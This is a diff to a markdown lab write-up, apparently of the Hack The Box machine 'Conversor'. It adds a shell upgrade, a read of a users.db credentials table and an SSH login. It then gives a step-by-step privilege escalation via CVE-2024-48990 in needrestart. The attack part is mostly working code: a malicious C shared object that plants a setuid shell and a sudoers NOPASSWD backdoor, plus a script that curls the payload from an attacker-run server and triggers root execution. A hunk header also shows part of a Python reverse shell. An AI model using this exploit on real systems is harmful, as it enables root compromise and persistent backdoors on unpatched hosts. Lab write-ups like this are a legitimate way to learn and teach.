@@ -1,6 +1,10 @@
 # Conversor
 
 
+<img width="1609" height="363" alt="image" src="https://github.com/user-attachments/assets/afaef089-929a-44cb-8566-d61fbb50105a" />
+
+
+
 ## **`Nmap`** Scan
 
 ```ruby
@@ -141,29 +145,170 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 <img width="745" height="158" alt="image" src="https://github.com/user-attachments/assets/afc15be1-24e0-4451-b830-29fc52a38e09" />
 
 
+```ruby
+python3 -c 'import pty,os; pty.spawn("/bin/bash")'
+```
+
+
+```
+cd /var/www/conversor.htb
+cd instance
+sqlite3 ./users.db "SELECT * FROM users;"
+```
+
+
+<img width="606" height="102" alt="image" src="https://github.com/user-attachments/assets/e3a3514e-7cb0-4e5a-9fbd-b8d90dbb443e" />
+
+<img width="1517" height="558" alt="image" src="https://github.com/user-attachments/assets/d60d6fdb-493b-4597-bffe-88f73077fa23" />
+
+```
+ssh fismathack@10.10.10.10
+```
+
+
+<img width="763" height="259" alt="image" src="https://github.com/user-attachments/assets/56a2d242-d5c6-4f79-809e-c244435b31c1" />
+
+
+## PrivEsc
+
+
+<img width="1266" height="498" alt="image" src="https://github.com/user-attachments/assets/e659c933-cac8-442c-86b7-d2f100439eca" />
+
+
+## [CVE-2024-48990](https://github.com/ns989/CVE-2024-48990?source=post_page-----330f55df8c2f---------------------------------------)
+
+<img width="971" height="198" alt="image" src="https://github.com/user-attachments/assets/93d98924-7b24-4310-a517-7674329d3ac9" />
+
+---
+
+The **needrestart** program scans the processes and checks if they need to be restarted after updating libraries in the system.
+
+The disaster?\
+Version **3.7-a and earlier** works:
+
+✔ Check **for Python modules**\
+✔ Using **importlib**\
+✔ **No sandboxing or path restriction**
+
+This means that:
+
+>If the attacker was able to make needrestart do "import" for the Python model\
+> It will load any shared object `.so` file located inside PYTHONPATH\
+> Any **shared object** can run code with ROOT privileges\
+> Because needrestart works with sudo.
+
+This is the essence of privilege escalation.
+
+* * * * *
+
+🧩 **Exploiting the vulnerability --- Step by Step**
+=================================================
+
+1️⃣ **Confirm there is needrestart**
+------------------------------
+
+First step:
+
+`/usr/sbin/needrestart -v`
+
+You will find the version:
+
+`3.7-a`
+
+This is a *vulnerable* version according to the CVE.
+
+
+2️⃣ **Offensive idea**
+-----------------------
+
+We work:
+
+- Shared object (`__init__.so`) has malicious constructor.
+
+- Let needrestart run **import importlib** from the folder we created.
+
+- The shared object is replaced by the real library.
+
+- The first thing to do is---the code will be executed with ROOT privileges.
+
+
+---
+
+## on my machine
+
+```
+nano lib.c
+```
+
+```c
+static void a() __attribute__((constructor));
+void a() {
+    if(geteuid() == 0) { 
+        setuid(0);
+        setgid(0);
+        const char *shell = "cp /bin/sh /tmp/poc; "
+                            "chmod u+s /tmp/poc; "
+                            "grep -qxF 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' /etc/sudoers || "
+                            "echo 'ALL ALL=(ALL) NOPASSWD: /tmp/poc' >> /etc/sudoers";
+        system(shell);
+    }
+}
+
 ```
 
 ```
+gcc -shared -fPIC -o __init__.so lib.c
+```
+
+```
+python3 -m http.server 8888
+```
+
+## on server
+
+```
+nano exploit.sh
+```
+
+
+```
+#!/bin/bash
+set -e
+cd /tmp
+mkdir -p malicious/importlib
+curl http://10.10.14.96:8888/__init__.so -o /tmp/malicious/importlib/__init__.so
+cat << 'EOF' > /tmp/malicious/e.py
+import time
+import os
+
+while True:
+    try:
+        import importlib
+    except:
+        pass
+    if os.path.exists("/tmp/poc"):
+        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
+        os.system("sudo /tmp/poc -p")
+        break
+    time.sleep(1)
+EOF
+echo "Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell."
+cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
+
+```
+
+<img width="819" height="95" alt="image" src="https://github.com/user-attachments/assets/7e728e80-aa8a-45fc-8eea-506e672b6344" />
+
+
+## in another shell run 
+
+```
+sudo /usr/sbin/needrestart
+```
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<img width="855" height="383" alt="image" src="https://github.com/user-attachments/assets/795c4ea7-f303-4307-b7b3-91d8a48d6ece" />
 
 
 
